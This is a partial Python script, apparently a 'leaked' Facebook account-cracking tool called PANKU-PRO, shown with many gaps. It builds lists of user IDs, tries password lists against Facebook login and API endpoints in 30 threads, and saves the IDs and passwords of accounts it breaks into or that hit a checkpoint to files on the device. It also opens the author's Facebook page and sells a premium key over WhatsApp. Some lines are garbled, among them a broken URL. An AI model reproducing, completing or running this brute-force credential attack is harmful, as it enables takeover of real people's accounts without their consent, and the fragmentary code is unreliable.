#LEAKED BY : P9NK9J M3HR9
#LIKNG TATA LATEST SC 
#ENJOY GUYS
from os import path
import os,base64,zlib,pip,urllib
os.system('xdg-open https://www.facebook.com/jhumon.jesminrehana')
...
logo=("""\033[1;37m
  ._____            _               â”‚
â”‚     |  __ \          | |              â”‚
â”‚     | |__) |_ _ _ __ | | ___   _      â”‚
â”‚     |  ___/ _` | '_ \| |/ / | | |     â”‚
â”‚     | |  | (_| | | | |   <| |_| |     â”‚
â”‚     |_|   \__,_|_| |_|_|\_\\__,_|     â”‚'
â”‚
----------------------------------------------
 Author    : PANKAJ MEHRA
 Github    : PANKAJ XD
 Facebook  : P9NK9J.M3HR9.143.P9NKU
 Tool Name : PANKU-PRO
 Type type : BERO KONI
 Version   : 1.9.8
---------------------------------------------
Panku Pro version 1.9.8
 For Haters: BHAI RAM RAM OR PYAAR SE UMHHðŸ˜˜ðŸ¤ž
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def login():
        ...
        try:
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12; V2037 Build/SP1A.210812.003;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open httAkwww.facebook.com/P9NK9J.M3HR9.143.P9NKU');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+916367732128&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi Panku Sir, I Need To Buy Your Paid PANKU PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python PANKU.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Panku:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                Panku.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [PANKU-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [PANKU-OK] %s | %s'%(ids,pas))
                                open('/sdcard/PANKU-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Panku:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [PANKU-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/PANKU-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [PANKU-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/PANKU-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/PANKU-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [PANKU-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/PANKU-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [PANKU-OK] '+uid+' | '+pas+'\033[1;97m')
